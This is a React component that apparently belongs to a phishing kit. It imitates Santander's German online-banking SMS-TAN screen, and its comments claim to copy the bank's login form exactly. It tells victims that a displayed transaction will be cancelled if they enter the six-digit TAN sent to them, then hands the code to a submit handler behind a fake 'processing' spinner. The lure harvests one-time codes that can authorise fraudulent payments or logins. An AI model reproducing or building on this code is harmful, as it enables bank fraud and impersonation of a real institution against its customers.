import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({ 
  tanType,
  phoneNumber = '+49 *** *** **89',
  transactionDetails = {},
  onSubmit, 
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [isMobile, setIsMobile] = useState(false);

  // Mobile detection exactly like Santander LoginForm
  useEffect(() => {
    const checkMobile = () => {
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile);
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);

  useEffect(() => {
    if (resendCooldown > 0) {
      const timer = setTimeout(() => {
        setResendCooldown(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [resendCooldown]);

  const handleSubmit = async () => {
    if (tan.length !== 6) return;
    
    setIsSubmitting(true);
    
    setTimeout(() => {
      onSubmit(tan);
      setIsSubmitting(false);
    }, 1500);
  };

  const handleResend = () => {
    if (resendCooldown > 0) return;
    
    setResendCooldown(60);
    setTan('');
    onResend?.();
  };

  const handleTanChange = (value: string) => {
    const numericValue = value.replace(/\D/g, '').slice(0, 6);
    setTan(numericValue);
  };

  return (
    <>
      {isSubmitting && (
        <Loading 
          message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird verarbeitet...'}
          type="processing"
          showProgress={true}
          duration={1.5}
        />
      )}
      
      <div 
        className={isMobile ? "chrome-mobile-fix chrome-flex-container" : "santander-container"}
        style={{ 
          minHeight: '80vh',
          display: 'flex',
          alignItems: 'flex-start',
          paddingTop: isMobile ? '1rem' : '4rem',
          position: 'relative',
          boxSizing: 'border-box',
          width: '100%',
          WebkitBoxSizing: 'border-box'
        } as React.CSSProperties}>
        
        <div style={{
          display: 'flex',
          width: '100%',
          alignItems: 'flex-start',
          flexDirection: isMobile ? 'column' : 'row',
          gap: isMobile ? '2rem' : '6rem',
          boxSizing: 'border-box'
        } as React.CSSProperties}>
          
          {/* Left side - SMS TAN Form */}
          <div 
            className={isMobile ? "chrome-flex-item" : ""}
            style={{ 
              flex: '1', 
              maxWidth: isMobile ? '100%' : '500px',
              width: '100%',
              boxSizing: 'border-box'
            } as React.CSSProperties}>
            
            {/* Title exactly like Santander LoginForm */}
            <h1 style={{ 
              fontSize: isMobile ? '1.75rem' : '2.25rem',
              fontWeight: '600', 
              color: '#444', 
              marginBottom: '0.5rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif',
              lineHeight: '1.2'
            } as React.CSSProperties}>
              {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
            </h1>
            
            {/* Subtitle with instruction */}
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: isMobile ? '2rem' : '2.5rem',
              fontFamily: 'santander_regular, Arial, sans-serif',
              lineHeight: '1.4'
            }}>
              {tanType === 'TRANSACTION_TAN' 
                ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
              }
            </p>

            {/* Transaction details card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div className="santander-card" style={{
                backgroundColor: 'white',
                borderRadius: '8px',
                boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
                padding: '2rem',
                margin: '1rem 0 2rem 0'
              }}>
                <h2 style={{
                  fontSize: '2rem',
                  fontFamily: 'santander_headline_bold, Arial, sans-serif',
                  fontWeight: 'bold',
                  color: '#444',
                  marginBottom: '1.5rem'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #d1d8d9'
                  }}>
                    <span style={{
                      color: '#444',
                      fontSize: '0.9rem',
                      fontFamily: 'santander_bold, Arial, sans-serif',
                      fontWeight: 'bold'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#9e3667',
                      fontSize: '1.125rem',
                      fontFamily: 'santander_bold, Arial, sans-serif',
                      fontWeight: 'bold'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '0.75rem',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_bold, Arial, sans-serif',
                        fontWeight: 'bold'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_regular, Arial, sans-serif',
                        textAlign: 'right'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '0.75rem',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_bold, Arial, sans-serif',
                        fontWeight: 'bold'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_bold, Arial, sans-serif',
                        fontWeight: 'bold'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#444',
                        fontSize: '0.9rem',
                        fontFamily: 'santander_regular, Arial, sans-serif',
                        textAlign: 'right'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* TAN Input Section */}
            <div style={{ marginBottom: '1.5rem' }}>
              <h3 style={{
                fontSize: '16px',
                fontWeight: '600',
                color: '#444',
                margin: '0 0 1.5rem 0',
                fontFamily: 'santander_bold, Arial, sans-serif'
              }}>
                {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
              </h3>
              
              <div style={{ 
                display: 'flex', 
                justifyContent: 'center', 
                gap: '0.5rem',
                marginBottom: '2rem'
              }}>
                {[...Array(6)].map((_, i) => (
                  <div 
                    key={i} 
                    onClick={() => document.getElementById('hidden-tan-input')?.focus()}
                    style={{
                      width: '50px',
                      height: '60px',
                      border: i < tan.length ? '1px solid #9e3667' : '1px solid #d1d8d9',
                      borderRadius: '4px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '24px',
                      fontWeight: 'bold',
                      color: '#444',
                      backgroundColor: i < tan.length ? '#f0f8ff' : 'white',
                      cursor: 'pointer',
                      transition: 'all 0.3s ease',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}
                  >
                    {tan[i] || ''}
                  </div>
                ))}
              </div>
              
              <input
                id="hidden-tan-input"
                type="text"
                value={tan}
                onChange={(e) => handleTanChange(e.target.value)}
                style={{ position: 'absolute', opacity: 0, pointerEvents: 'none' }}
                autoFocus
              />
            </div>

            {/* Action buttons exactly like Santander LoginForm */}
            <div style={{ marginBottom: '1rem' }}>
              <button
                onClick={handleSubmit}
                disabled={tan.length !== 6 || isSubmitting}
                style={{
                  backgroundColor: (tan.length !== 6 || isSubmitting) ? '#6c757d' : '#9e3667',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '16px 24px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: (tan.length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                  fontFamily: 'santander_bold, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  display: 'block',
                  textAlign: 'center',
                  width: '100%',
                  boxShadow: 'none',
                  textTransform: 'none',
                  letterSpacing: 'normal'
                }}
                onMouseEnter={(e) => {
                  if (tan.length === 6 && !isSubmitting) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#8a2f5a';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                  }
                }}
                onMouseLeave={(e) => {
                  if (tan.length === 6 && !isSubmitting) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#9e3667';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                  }
                }}
              >
                {isSubmitting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                  : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                }
              </button>
            </div>

            {/* Footer Links exactly like Santander LoginForm */}
            <div style={{ 
              display: 'flex', 
              flexDirection: 'column', 
              gap: '1rem',
              fontSize: '14px',
              color: '#444'
            }}>
              {onResend && (
                <div style={{ textAlign: 'center' }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      handleResend();
                    }}
                    style={{ 
                      color: resendCooldown > 0 ? '#999' : '#9e3667', 
                      textDecoration: 'none',
                      fontFamily: 'santander_regular, Arial, sans-serif',
                      cursor: resendCooldown > 0 ? 'not-allowed' : 'pointer'
                    }}
                  >
                    {resendCooldown > 0 
                      ? `SMS erneut senden (${resendCooldown}s)`
                      : 'SMS erneut senden'
                    }
                  </a>
                </div>
              )}
              
              {onCancel && (
                <div style={{ textAlign: 'center' }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      onCancel();
                    }}
                    style={{ 
                      color: '#9e3667', 
                      textDecoration: 'none',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}
                  >
                    {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                  </a>
                </div>
              )}
            </div>
          </div>
          
          {/* Right side - Illustration (only on desktop) */}
          {!isMobile && (
            <div style={{ 
              flex: '1', 
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              minHeight: '600px'
            }}>
              <div style={{
                width: '400px',
                height: '400px',
                backgroundImage: 'url(/templates/santander/images/home-login.png)',
                backgroundSize: 'contain',
                backgroundRepeat: 'no-repeat',
                backgroundPosition: 'center'
              }} />
            </div>
          )}
        </div>
      </div>

      <style jsx>{`
        /* Chrome mobile fixes exactly like Santander LoginForm */
        @media screen and (-webkit-min-device-pixel-ratio: 0) {
          html, body {
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
          }
        }
        
        @supports (-webkit-appearance: none) {
          .chrome-mobile-fix {
            -webkit-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
          }
        }
        
        @media (max-width: 768px) {
          .chrome-flex-container {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: flex !important;
            -webkit-box-orient: vertical !important;
            -webkit-box-direction: normal !important;
            -webkit-flex-direction: column !important;
            flex-direction: column !important;
            width: 100% !important;
            min-height: 100vh !important;
            padding: 0 1.5rem !important;
            box-sizing: border-box !important;
          }
          
          .chrome-flex-item {
            -webkit-box-flex: 1 !important;
            -webkit-flex: 1 !important;
            flex: 1 !important;
            width: 100% !important;
            max-width: 100% !important;
            min-width: 100% !important;
            box-sizing: border-box !important;
          }
        }
      `}</style>
    </>
  );
};

export default SMSTANScreen;